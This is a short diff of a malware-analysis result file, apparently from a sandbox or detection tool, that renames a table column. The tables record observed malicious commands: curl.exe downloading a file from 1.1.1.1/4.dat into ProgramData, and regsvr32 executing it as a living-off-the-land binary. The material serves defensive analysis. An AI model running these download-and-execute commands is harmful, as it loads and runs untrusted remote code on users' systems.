@@ -5,7 +5,7 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[{\"LOLBAS\": \"regsvr32\", \"Command [trun.]\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
+        "body": "[{\"LOLBAS\": \"regsvr32\", \"Command\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -23,7 +23,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command [trun.]\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
+        "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
